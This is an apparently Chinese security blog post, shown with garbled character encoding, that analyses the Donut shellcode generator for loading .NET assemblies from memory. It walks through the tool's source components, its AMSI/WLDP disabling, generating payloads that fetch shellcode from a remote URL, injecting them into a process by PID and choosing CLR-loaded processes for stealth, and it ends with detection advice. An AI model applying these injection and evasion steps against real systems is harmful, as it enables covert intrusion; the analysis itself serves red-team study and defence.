I"›8<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>Donutæ˜¯ä¸€ä¸ªshellcodeç”Ÿæˆå·¥å…·ï¼Œå¯ä»¥å°†.NETç¨‹åºé›†è½¬æ¢ä¸ºshellcodeã€‚è¿™æ˜¯å¯¹execute-assemblyçš„è¿›ä¸€æ­¥åˆ©ç”¨ï¼Œéšè”½æ€§æ›´é«˜ï¼Œå¯æ‰©å±•æ€§æ›´å¼ºã€‚</p>

<p>ç»“åˆbyt3bl33d3rçš„<a href="https://github.com/byt3bl33d3r/SILENTTRINITY">SILENTTRINITY</a>ï¼Œå°†å…¶è½¬æ¢ä¸ºshellcodeå¹¶è¿›è¡Œæ³¨å…¥ï¼Œé€‚ç”¨æ€§æ›´å¹¿ã€‚</p>

<p>æœ¬æ–‡å°†ä¼šå¯¹Donutè¿›è¡Œæµ‹è¯•ï¼Œé€ä¸ªåˆ†æDonutå·¥ç¨‹ä¸­çš„ä»£ç ï¼Œæ€»ç»“è¿™ä¸ªå·¥å…·çš„ç‰¹ç‚¹ã€‚</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>æœ¬æ–‡æµ‹è¯•çš„ç‰ˆæœ¬ä½¿ç”¨çš„æ˜¯Donut v0.9ï¼Œæ–°ç‰ˆæœ¬å°†ä¼šæ·»åŠ æ›´å¤šçš„åŠŸèƒ½ï¼Œå€¼å¾—æŒç»­å…³æ³¨</p>

<p>Donutåœ°å€ï¼š</p>

<p>https://github.com/TheWover/donut</p>

<p>ä»‹ç»Donutç»†èŠ‚çš„æ–‡ç« ï¼š</p>

<p>https://thewover.github.io/Introducing-Donut/</p>

<p>https://modexp.wordpress.com/2019/05/10/dotnet-loader-shellcode/</p>

<p>https://modexp.wordpress.com/2019/06/03/disable-amsi-wldp-dotnet/</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>ç›¸å…³æŠ€æœ¯ä»‹ç»</li>
  <li>æºç ç»“æ„</li>
  <li>å®é™…æµ‹è¯•</li>
  <li>åˆ©ç”¨åˆ†æ</li>
</ul>

<h2 id="0x02-ç›¸å…³æŠ€æœ¯ä»‹ç»">0x02 ç›¸å…³æŠ€æœ¯ä»‹ç»</h2>
<hr />

<h3 id="1assemblyload">1.Assembly.Load</h3>

<p>ç”¨äºåœ¨å½“å‰è¿›ç¨‹ä¸­åŠ è½½.NETç¨‹åºé›†ï¼Œæ— æ³•æ³¨å…¥å…¶ä»–è¿›ç¨‹</p>

<p>.NETç¨‹åºé›†çš„æµ‹è¯•ä»£ç ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>namespace ConsoleApplication1
{
    public class Program
    {
        public static void test()
        {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "c:\\windows\\system32\\calc.exe";  
            p.Start();
        }
        static void Main(string[] args)
        {
            test();
        }   
    }
}
</code></pre></div></div>

<p>åŠ è½½è¿™ä¸ª.NETç¨‹åºé›†çš„æ—¶å€™ä¼šå¼¹å‡ºè®¡ç®—å™¨ï¼Œç”¨ä½œéªŒè¯åŠŸèƒ½</p>

<h4 id="1powershellå®ç°assemblyload">(1)Powershellå®ç°Assembly.Load</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$bytes = [System.IO.File]::ReadAllBytes("ConsoleApplication1.exe")
[Reflection.Assembly]::Load($bytes)
[ConsoleApplication1.Program]::test()
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>å¯å‚è€ƒä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8Assembly-Load-&amp;-LoadFile%E7%BB%95%E8%BF%87Applocker%E7%9A%84%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93">ã€Šåˆ©ç”¨Assembly Load &amp; LoadFileç»•è¿‡Applockerçš„åˆ†ææ€»ç»“ã€‹</a></p>

<h4 id="2cå®ç°assemblyload">(2)C#å®ç°Assembly.Load</h4>

<p>https://github.com/anthemtotheego/SharpCradle</p>

<p>ä»£ç å®ç°äº†ä»è¿œç¨‹æœåŠ¡å™¨ä¸‹è½½.NETç¨‹åºé›†å¹¶é€šè¿‡Assembly.Loadè¿›è¡ŒåŠ è½½</p>

<h3 id="2execute-assembly">2.execute-assembly</h3>

<p>ä»å†…å­˜ä¸­åŠ è½½.NETç¨‹åºé›†ï¼Œèƒ½å¤Ÿä»¥dllçš„å½¢å¼æ³¨å…¥åˆ°å…¶ä»–è¿›ç¨‹ä¸­</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>å¯å‚è€ƒä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/%E4%BB%8E%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD.NET%E7%A8%8B%E5%BA%8F%E9%9B%86(execute-assembly)%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90">ã€Šä»å†…å­˜åŠ è½½.NETç¨‹åºé›†(execute-assembly)çš„åˆ©ç”¨åˆ†æã€‹</a></p>

<p>æ•´ä¸ªè¿‡ç¨‹åœ¨å†…å­˜æ‰§è¡Œï¼Œä¸å†™å…¥æ–‡ä»¶ç³»ç»Ÿ(æ­¤æ—¶æ³¨å…¥dlléœ€è¦ä½¿ç”¨Dllåå°„)</p>

<p>Payloadä»¥dllå½¢å¼å­˜åœ¨ï¼Œä¸ä¼šäº§ç”Ÿå¯ç–‘çš„è¿›ç¨‹</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>å¦‚æœä½¿ç”¨LoadlibraryåŠ è½½dllï¼Œdllå¿…é¡»å†™å…¥æ–‡ä»¶ç³»ç»Ÿ</p>

<h3 id="3donut">3.Donut</h3>

<p>åŸºäºexecute-assemblyï¼Œä»¥shellcodeçš„å½¢å¼å®ç°ä»å†…å­˜ä¸­åŠ è½½.NETç¨‹åºé›†</p>

<p>ä¼˜ç‚¹æ˜¯æ³¨å…¥åˆ°å…¶ä»–è¿›ç¨‹æ—¶ä¸å†ä¾èµ–äºDllåå°„ï¼Œæ›´éšè”½ï¼Œæ›´æ˜“äºæ‰©å±•</p>

<p>æ›´éšè”½æ˜¯æŒ‡æ³¨å…¥å…¶ä»–è¿›ç¨‹æ—¶ä¸ä¼šå­˜åœ¨dll</p>

<p>æ›´æ˜“äºæ‰©å±•æ˜¯æŒ‡èƒ½å¤Ÿæ‰§è¡Œshellcodeçš„æ–¹æ³•éƒ½å¯ä»¥ä½¿ç”¨Donutï¼ŒåŸºäºDonutçš„äºŒæ¬¡å¼€å‘ä¹Ÿå¾ˆå®¹æ˜“</p>

<h2 id="0x03-æºç ç»“æ„">0x03 æºç ç»“æ„</h2>
<hr />

<p>é’ˆå¯¹0.9ç‰ˆæœ¬çš„æ–‡ä»¶</p>

<h3 id="1å­é¡¹ç›®">1ã€å­é¡¹ç›®</h3>

<h4 id="1democreateprocess">1.DemoCreateProcess</h4>

<p>https://github.com/TheWover/donut/tree/master/DemoCreateProcess</p>

<p>c#ç¨‹åºï¼Œç¼–è¯‘åç”Ÿæˆæ–‡ä»¶ClassLibrary.dllï¼ŒåŠŸèƒ½ä¸ºå°†ä¼ å…¥çš„ä¸¤ä¸ªå‚æ•°ä½œä¸ºå¯åŠ¨è¿›ç¨‹</p>

<p>å¯é€šè¿‡Donutå°†å…¶è½¬æ¢æˆshellcodeï¼Œç”¨ä½œæµ‹è¯•Donutç”Ÿæˆshellcodeçš„åŠŸèƒ½æ˜¯å¦æœ‰æ•ˆ</p>

<h4 id="2donuttest">2.DonutTest</h4>

<p>https://github.com/TheWover/donut/tree/master/DonutTest</p>

<p>c#ç¨‹åºï¼Œç¼–è¯‘åç”Ÿæˆæ–‡ä»¶DonutTest.exeï¼Œç”¨äºå‘æŒ‡å®špidçš„è¿›ç¨‹æ³¨å…¥shellcode</p>

<p>å®ç°ç»†èŠ‚ï¼š</p>

<p>æ•°ç»„ä¸­ä¿å­˜base64åŠ å¯†åçš„shellcodeï¼Œè§£å¯†åé€šè¿‡CreateRemoteThreadæ³¨å…¥åˆ°æŒ‡å®šè¿›ç¨‹</p>

<h4 id="3rundotnetcpp">3.rundotnet.cpp</h4>

<p>https://github.com/TheWover/donut/blob/master/DonutTest/rundotnet.cpp</p>

<p>cç¨‹åºï¼Œç¼–è¯‘åçš„æ–‡ä»¶ä¸ºrundotnet.exeï¼Œç”¨äºè¯»å–æŒ‡å®šæ–‡ä»¶å¹¶ä½¿ç”¨CLRä»å†…å­˜åŠ è½½.NETç¨‹åºé›†</p>

<p>ä»å†…å­˜åŠ è½½.NETç¨‹åºé›†ä½¿ç”¨çš„æ–¹æ³•ï¼š</p>

<ul>
  <li>ä½¿ç”¨å½“å‰ç³»ç»Ÿä¸­æœ€æ–°ç‰ˆæœ¬çš„.Net</li>
  <li>ä½¿ç”¨ICorRuntimeHostæ¥å£</li>
  <li>ä½¿ç”¨Load_3(â€¦)ä»å†…å­˜ä¸­è¯»å–å¹¶åŠ è½½.NETç¨‹åºé›†çš„Mainæ–¹æ³•</li>
</ul>

<h4 id="4modulemonitor">4.ModuleMonitor</h4>

<p>https://github.com/TheWover/donut/tree/master/ModuleMonitor</p>

<p>ä½¿ç”¨WMIäº‹ä»¶Win32_ModuleLoadTraceæ¥ç›‘è§†æ¨¡å—åŠ è½½ï¼Œå¦‚æœå‘ç°CLRæ³¨å…¥ï¼Œå°†ä¼šæ ‡è®°</p>

<p>WMIäº‹ä»¶Win32_ModuleLoadTraceï¼š</p>

<p>https://docs.microsoft.com/en-us/previous-versions/windows/desktop/krnlprov/win32-moduleloadtrace</p>

<p>ç¨‹åºä¸­åˆ¤æ–­CLRæ³¨å…¥çš„æ–¹æ³•ï¼š</p>

<p>å¦‚æœè¿›ç¨‹åŠ è½½äº†CLRï¼Œä½†ç¨‹åºä¸æ˜¯.NETç¨‹åºé›†ï¼Œåˆ™CLRå·²æ³¨å…¥å…¶ä¸­</p>

<p>ç¨‹åºä¸­åˆ¤æ–­è¿›ç¨‹åŠ è½½CLRçš„æ–¹æ³•ï¼š</p>

<p>è¿›ç¨‹æ˜¯å¦åŠ è½½äº†ä¸CLRç›¸å…³çš„dll(mscoree.dll,mscoreei.dllå’Œmscorlib.dll)ï¼Œdllä»¥â€mscoâ€å¼€å¤´</p>

<p>è¿™ä¸ªå·¥ç¨‹ä¸€èˆ¬æ˜¯ä½œé˜²å¾¡æ£€æµ‹ç”¨ï¼Œç”¨æ¥æ£€æµ‹ç³»ç»Ÿæ˜¯å¦äº§ç”Ÿäº†CLRæ³¨å…¥äº‹ä»¶ï¼Œæ‰€ä»¥åœ¨å¯åŠ¨åè¿›ç¨‹ä¼šä¸€ç›´æ‰§è¡Œï¼Œå®æ—¶è®°å½•ç³»ç»ŸåŠ è½½æ–°æ¨¡å—çš„äº‹ä»¶</p>

<p>è¿™ä¸ªåœ°æ–¹ä½¿ç”¨tasklist.exeä¹Ÿèƒ½å®ç°ç±»ä¼¼çš„åŠŸèƒ½ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasklist /m msco*
</code></pre></div></div>

<p>èƒ½å¤Ÿè·å¾—å“ªäº›è¿›ç¨‹è°ƒç”¨äº†ä»¥â€mscoâ€å¼€å¤´çš„dll</p>

<h4 id="5processmanager">5.ProcessManager</h4>

<p>https://github.com/TheWover/donut/tree/master/ProcessManager</p>

<p>ç”¨äºæšä¸¾å½“å‰è®¡ç®—æœºæˆ–è¿œç¨‹è®¡ç®—æœºä¸Šçš„è¿›ç¨‹</p>

<p>åŒtasklist.exeçš„åŠŸèƒ½ç±»ä¼¼ï¼Œå¢åŠ ä»¥ä¸‹åŠŸèƒ½ï¼š</p>

<ul>
  <li>åˆ¤æ–­è¿›ç¨‹æƒé™</li>
  <li>åˆ¤æ–­è¿›ç¨‹ä½æ•°(32ä½è¿˜æ˜¯64ä½)</li>
  <li>åˆ¤æ–­è¿›ç¨‹æ˜¯å¦åŠ è½½CLR</li>
</ul>

<h3 id="2ç»„ä»¶">2ã€ç»„ä»¶</h3>

<h4 id="1httpsgithubcomthewoverdonutblobmasterpayloadpayloadc">1.https://github.com/TheWover/donut/blob/master/payload/payload.c</h4>

<p>Donutçš„å…³é”®åŠŸèƒ½ï¼Œå®ç°ä»¥ä¸‹æ“ä½œï¼š</p>

<p>(1)è·å¾—shellcodeå¹¶è§£å¯†</p>

<p>æä¾›ä¸¤ç§æ–¹å¼ï¼š</p>

<ul>
  <li>ä»payload.hè¯»å–shellcodeå’Œè§£å¯†å¯†é’¥</li>
  <li>ä»HTTPæœåŠ¡å™¨ä¸‹è½½shellcodeå’Œè§£å¯†å¯†é’¥</li>
</ul>

<p>(2)ä½¿ç”¨CLRä»å†…å­˜åŠ è½½.NETç¨‹åºé›†</p>

<ul>
  <li>è°ƒç”¨ICLRMetaHost::GetRuntimeæ–¹æ³•è·å–ICLRRuntimeInfoæŒ‡é’ˆ</li>
  <li>ä½¿ç”¨ICorRuntimeHostæ¥å£</li>
  <li>å°è¯•å…³é—­AMSIå’ŒWLDP</li>
  <li>ä½¿ç”¨Load_3(â€¦)ä»å†…å­˜ä¸­è¯»å–</li>
</ul>

<p><strong>æ³¨ï¼š</strong></p>

<p>ä»‹ç»å…³é—­AMSIå’ŒWLDPçš„ç»†èŠ‚ï¼š</p>

<p>https://modexp.wordpress.com/2019/06/03/disable-amsi-wldp-dotnet/</p>

<p>å€¼å¾—æ³¨æ„çš„åœ°æ–¹ï¼š</p>

<p>é€šå¸¸æƒ…å†µä¸‹ï¼Œä½¿ç”¨ICorRuntimeHostæ¥å£æ—¶éœ€è¦è°ƒç”¨mscorlib.tlb</p>

<p>è¿™é‡Œå¹¶æ²¡æœ‰ä½¿ç”¨mscorlib.tlbï¼Œæ˜¯é€šè¿‡æ‰‹åŠ¨å®šä¹‰çš„æ–¹å¼å®ç°</p>

<p>æ›´å¤šç»†èŠ‚å¯å‚è€ƒï¼š</p>

<p>https://modexp.wordpress.com/2019/05/10/dotnet-loader-shellcode/</p>

<h4 id="2httpsgithubcomthewoverdonuttreemasterpayloadexe2h">2.https://github.com/TheWover/donut/tree/master/payload/exe2h</h4>

<p>ç”¨æ¥å°†exeè½¬æ¢ä¸ºshellcodeå¹¶ä¿å­˜åˆ°æ•°ç»„ä¸­</p>

<p>ä»payload.exeä¸­çš„.textæ®µä¸­æå–å·²ç¼–è¯‘çš„æœºå™¨ç (åŒ…æ‹¬dllå’Œè§£å¯†å¯†é’¥)ï¼Œå°†å…¶ä½œä¸ºæ•°ç»„ä¿å­˜åˆ°payload_exe_x64.hæˆ–payload_exe_x86.h</p>

<h4 id="3httpsgithubcomthewoverdonutblobmasterpayloadpayload_exe_x64h">3.https://github.com/TheWover/donut/blob/master/payload/payload_exe_x64.h</h4>

<p>å­˜å‚¨64ä½çš„æœºå™¨ç (åŒ…æ‹¬dllå’Œè§£å¯†å¯†é’¥)</p>

<h4 id="4httpsgithubcomthewoverdonutblobmasterpayloadpayload_exe_x86h">4.https://github.com/TheWover/donut/blob/master/payload/payload_exe_x86.h</h4>

<p>å­˜å‚¨32ä½çš„æœºå™¨ç (åŒ…æ‹¬dllå’Œè§£å¯†å¯†é’¥)</p>

<h4 id="5httpsgithubcomthewoverdonutblobmasterpayloadinjectc">5.https://github.com/TheWover/donut/blob/master/payload/inject.c</h4>

<p>ä½¿ç”¨RtlCreateUserThreadå‘æŒ‡å®šè¿›ç¨‹æ³¨å…¥shellcode</p>

<p>å¯ç”¨ä½œæµ‹è¯•å‘æŒ‡å®šè¿›ç¨‹æ³¨å…¥shellcodeçš„åŠŸèƒ½</p>

<h4 id="6httpsgithubcomthewoverdonutblobmasterpayloadrunscc">6.https://github.com/TheWover/donut/blob/master/payload/runsc.c</h4>

<p>C/Sæ¶æ„ï¼Œä¸¤ä¸ªåŠŸèƒ½ï¼Œå¯ä»¥å‘é€å’Œæ¥æ”¶shellcodeå¹¶æ‰§è¡Œ</p>

<p>ç”¨äºæµ‹è¯•payload.binçš„åŠŸèƒ½</p>

<h4 id="7httpsgithubcomthewoverdonutblobmasterencryptc">7.https://github.com/TheWover/donut/blob/master/encrypt.c</h4>

<p>å¯¹ç§°åŠ å¯†çš„å®ç°</p>

<h4 id="8httpsgithubcomthewoverdonutblobmasterhashc">8.https://github.com/TheWover/donut/blob/master/hash.c</h4>

<p>API Hashingï¼Œè¿™é‡Œä½¿ç”¨äº†Maru hash</p>

<h4 id="9httpsgithubcomthewoverdonutblobmasterdonutc">9.https://github.com/TheWover/donut/blob/master/donut.c</h4>

<p>ä¸»ç¨‹åºï¼Œç”¨äºå°†.NETç¨‹åºé›†è½¬æ¢æˆshellcode</p>

<h2 id="0x04-å®é™…æµ‹è¯•">0x04 å®é™…æµ‹è¯•</h2>
<hr />

<h3 id="1é€‰æ‹©æµ‹è¯•dll">1ã€é€‰æ‹©æµ‹è¯•dll</h3>

<p>è¿™é‡Œä½¿ç”¨å­é¡¹ç›®DemoCreateProcess</p>

<p>ç¼–è¯‘åç”Ÿæˆæ–‡ä»¶ClassLibrary.dll</p>

<h3 id="2ä½¿ç”¨donutç”Ÿæˆshellcode">2ã€ä½¿ç”¨Donutç”Ÿæˆshellcode</h3>

<p>64ä½ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>donut.exe -a 2 -f ClassLibrary.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe
</code></pre></div></div>

<p>32ä½ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>donut.exe -a 1 -f ClassLibrary.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe
</code></pre></div></div>

<p>å‘½ä»¤æ‰§è¡Œåç”Ÿæˆæ–‡ä»¶payload.bin</p>

<p>å¦‚æœåŠ äº†-uæŒ‡å®šURLï¼Œä¼šå†ç”Ÿæˆä¸€ä¸ªéšæœºåç§°çš„Moduleæ–‡ä»¶ï¼Œå®ä¾‹å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>donut.exe -a 2 -f ClassLibrary.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe -u http://192.168.1.1
</code></pre></div></div>

<p>ç”Ÿæˆæ–‡ä»¶payload.binå’ŒYX63F37T</p>

<p>å°†YX63F37Tä¸Šä¼ åˆ°http://192.168.1.1</p>

<p>æ¥ä¸‹æ¥é€šè¿‡æ³¨å…¥shellcodeçš„æ–¹å¼æ‰§è¡Œpayload.binï¼Œpayload.binä¼šä»http://192.168.1.1/YX63F37Tä¸‹è½½å®é™…çš„shellcodeå¹¶æ‰§è¡Œ</p>

<h3 id="3æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯">3ã€æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯</h3>

<p>è¿™é‡Œä½¿ç”¨å­é¡¹ç›®ProcessManager</p>

<p>åˆ—å‡ºè¿›ç¨‹åï¼ŒManagedé€‰é¡¹å¦‚æœä¸ºTrueï¼Œä»£è¡¨è¯¥è¿›ç¨‹å·²ç»åŠ è½½CLR</p>

<p>ProcessManageræ”¯æŒå¯¹æŒ‡å®šè¿›ç¨‹è¿›è¡Œç­›é€‰ï¼Œä¾‹å¦‚åªæŸ¥çœ‹notepad.exeçš„è¿›è¡Œä¿¡æ¯ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ProcessManager.exe --name notepad
</code></pre></div></div>

<h3 id="4æ³¨å…¥shellcode">4ã€æ³¨å…¥shellcode</h3>

<p>å‡è®¾ç›®æ ‡è¿›ç¨‹ä¸º3306</p>

<h4 id="1ä½¿ç”¨å­é¡¹ç›®donuttest">(1)ä½¿ç”¨å­é¡¹ç›®DonutTest</h4>

<p>å°†payload.binä½œbase64ç¼–ç å¹¶ä¿å­˜åœ¨å‰ªè´´æ¿ï¼Œpowershellå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$filename = "payload.bin"
[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | clip
</code></pre></div></div>

<p>æ›¿æ¢DonutTestå·¥ç¨‹ä¸­å¯¹åº”çš„å˜é‡ï¼Œç¼–è¯‘æˆåŠŸåæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DonutTest.exe 3306
</code></pre></div></div>

<h4 id="2ä½¿ç”¨rtlcreateuserthread">(2)ä½¿ç”¨RtlCreateUserThread</h4>

<p>https://github.com/TheWover/donut/blob/master/payload/inject.c</p>

<p>å‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>inject.exe 3306 payload.bin
</code></pre></div></div>

<h3 id="5æ£€æµ‹">5ã€æ£€æµ‹</h3>

<p>åˆ—å‡ºåŠ è½½äº†CLRä½†ä¸æ˜¯.NETç¨‹åºé›†çš„è¿›ç¨‹ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasklist /m msco*
</code></pre></div></div>

<h2 id="0x05-åˆ©ç”¨åˆ†æ">0x05 åˆ©ç”¨åˆ†æ</h2>
<hr />

<p>Donutèƒ½å¤Ÿå°†.NETç¨‹åºé›†è½¬æ¢ä¸ºshellcode</p>

<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œä½¿ç”¨C#å¼€å‘çš„ç¨‹åºéƒ½èƒ½é€šè¿‡Donutè½¬æ¢æˆshellcode</p>

<p>å°±ç›®å‰çš„è¶‹åŠ¿æ¥è¯´ï¼ŒC#å¼€æºçš„å·¥å…·è¶Šæ¥è¶Šå¤šï¼Œä¾‹å¦‚ï¼š</p>

<ul>
  <li>https://github.com/GhostPack/SharpWMI</li>
  <li>https://github.com/checkymander/Sharp-WMIExec</li>
  <li>https://github.com/jnqpblc/SharpTask</li>
</ul>

<p>åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼ŒC#å°†ä¼šé€æ­¥æ›¿ä»£Powershellï¼ŒDonutçš„åˆ©ç”¨ä¹Ÿä¼šæ˜¯ä¸€ä¸ªè¶‹åŠ¿</p>

<p>Donutçš„åˆ©ç”¨æ€è·¯ï¼š</p>

<ol>
  <li>å°†.NETç¨‹åºé›†è½¬æ¢ä¸ºshellcodeï¼Œä¾‹å¦‚é…åˆSILENTTRINITYä½¿ç”¨</li>
  <li>ä½œä¸ºæ¨¡å—é›†æˆåˆ°å…¶ä»–å·¥å…·ä¸­</li>
  <li>æ‰©å±•åŠŸèƒ½ï¼šæ”¯æŒç±»ä¼¼meterpreterçš„migrateåŠŸèƒ½</li>
</ol>

<p>ä¸ºäº†æ›´ä¸ºéšè”½ï¼Œå¯ä»¥å…ˆä½¿ç”¨ProcessManageråˆ—ä¸¾å·²ç»åŠ è½½CLRçš„è¿›ç¨‹ï¼Œå¯¹å…¶è¿›è¡Œæ³¨å…¥</p>

<p>Donutçš„æ£€æµ‹ï¼š</p>

<p>Donutéœ€è¦ä½¿ç”¨CLRä»å†…å­˜ä¸­åŠ è½½.NETç¨‹åºé›†ï¼Œå¯é‡‡å–ä»¥ä¸‹æ–¹æ³•è¿›è¡Œæ£€æµ‹ï¼š</p>

<ul>
  <li>è¿›ç¨‹ä¸æ˜¯.NETç¨‹åºé›†</li>
  <li>è¿›ç¨‹åŠ è½½äº†ä¸CLRç›¸å…³çš„dll(dllä»¥â€mscoâ€å¼€å¤´)</li>
</ul>

<p><strong>æ³¨ï¼š</strong></p>

<p>æ­£å¸¸ç¨‹åºä¹Ÿæœ‰å¯èƒ½å­˜åœ¨è¿™ä¸ªè¡Œä¸º</p>

<p>ä¸¤ç§æ£€æµ‹æ–¹æ³•ï¼š</p>

<ul>
  <li>ä½¿ç”¨å‘½ä»¤<code class="language-plaintext highlighter-rouge">tasklist /m msco*</code></li>
  <li>ä½¿ç”¨WMIäº‹ä»¶Win32_ModuleLoadTraceæ¥ç›‘è§†æ¨¡å—åŠ è½½</li>
</ul>

<p>å¯¹æ»¡è¶³ä»¥ä¸Šæ¡ä»¶çš„è¿›ç¨‹é‡ç‚¹ç›‘æ§</p>

<h2 id="0x06-å°ç»“">0x06 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡å¯¹Donutè¿›è¡Œäº†æµ‹è¯•åˆ†æï¼Œæ€»ç»“åˆ©ç”¨æ€è·¯ï¼Œç»™å‡ºé˜²å¾¡å»ºè®®ã€‚Donutå€¼å¾—æ·±å…¥ç ”ç©¶ï¼ŒæœŸå¾…Donutçš„æ–°ç‰ˆæœ¬</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET